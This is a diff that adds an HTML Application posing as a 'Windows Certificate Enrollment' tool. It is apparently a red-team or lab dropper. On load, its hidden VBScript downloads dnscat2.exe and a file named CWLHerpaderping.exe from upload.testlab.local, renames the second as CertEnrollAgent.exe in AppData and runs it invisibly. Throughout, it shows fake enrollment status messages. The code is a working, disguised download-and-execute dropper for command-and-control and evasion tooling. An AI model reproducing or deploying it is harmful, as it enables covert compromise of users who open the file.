@@ -1,0 +1,118 @@
+<html>
+<head>
+<title>Windows Certificate Enrollment</title>
+<HTA:APPLICATION
+    ID="WinCertEnroll"
+    APPLICATIONNAME="Windows Certificate Enrollment"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    NAVIGABLE="no"
+    SCROLL="no"
+    BORDER="none"
+    INNERBORDER="no"
+    CAPTION="no"
+/>
+<script language="VBScript">
+Sub UpdateStatus(strMsg)
+    document.getElementById("statusMsg").innerText = strMsg
+End Sub
+
+Sub Window_OnLoad
+
+    UpdateStatus "Enrolling certificate..."
+
+    Dim oShell          : Set oShell = CreateObject("WScript.Shell")
+    Dim strUser         : strUser     = oShell.ExpandEnvironmentStrings("%USERNAME%")
+    Dim strHost         : strHost     = oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
+    Dim strInstallDir   : strInstallDir = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\"
+    Dim strModuleName   : strModuleName = "CertEnrollAgent"
+    Dim strPackageFile  : strPackageFile = strInstallDir & strModuleName & ".bin"
+    Dim strModulePath   : strModulePath  = strInstallDir & strModuleName & ".exe"
+
+    Dim oParams : Set oParams = CreateObject("Scripting.Dictionary")
+    oParams.Add "component", "EntraID-CertEnrollment"
+    oParams.Add "host",      strHost
+    oParams.Add "user",      strUser
+    oParams.Add "timeout",   "30000"
+    oParams.Add "maxRetry",  "3"
+
+    Dim strRequired : strRequired = "4.2.1"
+    Dim arrVer      : arrVer  = Split(strRequired, ".")
+    Dim nMajor      : nMajor  = CInt(arrVer(0))
+    Dim nMinor      : nMinor  = CInt(arrVer(1))
+    Dim nPatch      : nPatch  = CInt(arrVer(2))
+
+    Dim strPayloadDrop  : strPayloadDrop = "C:\ProgramData\CertCA.bin"
+    Dim strPayloadUrl   : strPayloadUrl  = "http://upload.testlab.local/uploads/dnscat2.exe"
+    Dim oPayload        : Set oPayload   = CreateObject("MSXML2.XMLHTTP")
+    oPayload.Open "GET", strPayloadUrl, False
+    oPayload.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    oPayload.Send
+
+    If oPayload.Status = 200 And LenB(oPayload.responseBody) > 0 Then
+        Dim oPayloadStm : Set oPayloadStm = CreateObject("ADODB.Stream")
+        oPayloadStm.Type = 1
+        oPayloadStm.Open
+        oPayloadStm.Write oPayload.responseBody
+        oPayloadStm.SaveToFile strPayloadDrop, 2
+        oPayloadStm.Close
+        Set oPayloadStm = Nothing
+    End If
+    Set oPayload = Nothing
+
+    Dim strPackageUrl   : strPackageUrl = "http://upload.testlab.local/uploads/CWLHerpaderping.exe"
+    Dim oHttp           : Set oHttp = CreateObject("MSXML2.XMLHTTP")
+    Dim nAttempt        : nAttempt  = 0
+    Dim nMaxRetry       : nMaxRetry = CInt(oParams("maxRetry"))
+    Dim bReady          : bReady    = False
+
+    Do While nAttempt < nMaxRetry And Not bReady
+        nAttempt = nAttempt + 1
+        oHttp.Open "GET", strPackageUrl, False
+        oHttp.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        oHttp.Send
+        If oHttp.Status = 200 Then
+            UpdateStatus "Downloading certificate package..."
+            bReady = True
+        End If
+    Loop
+
+    If bReady Then
+        Dim nPackageSize : nPackageSize = LenB(oHttp.responseBody)
+
+        If nPackageSize > 0 Then
+            Dim oStream : Set oStream = CreateObject("ADODB.Stream")
+            oStream.Type = 1
+            oStream.Open
+            oStream.Write oHttp.responseBody
+            oStream.SaveToFile strPackageFile, 2
+            oStream.Close
+            Set oStream = Nothing
+
+            Dim oFs : Set oFs = CreateObject("Scripting.FileSystemObject")
+            If oFs.FileExists(strModulePath) Then oFs.DeleteFile strModulePath, True
+            oFs.MoveFile strPackageFile, strModulePath
+            Set oFs = Nothing
+
+            CreateObject("Shell.Application").ShellExecute strModulePath, "", strInstallDir, "open", 0
+        End If
+    End If
+
+    Set oParams = Nothing
+    Set oHttp   = Nothing
+    Set oShell  = Nothing
+
+    UpdateStatus "Certificate enrollment complete."
+
+    window.setTimeout "self.close", 5000, "VBScript"
+
+End Sub
+</script>
+</head>
+<body style="background:#f4f4f4; font-family:'Segoe UI',Arial,sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
+    <div style="text-align:center; color:#666; font-size:13px;">
+        <p style="font-weight:600; font-size:14px;">Windows Certificate Enrollment</p>
+        <p id="statusMsg" style="font-size:11px; margin-top:6px; color:#888;">Initializing...</p>
+    </div>
+</body>
+</html>
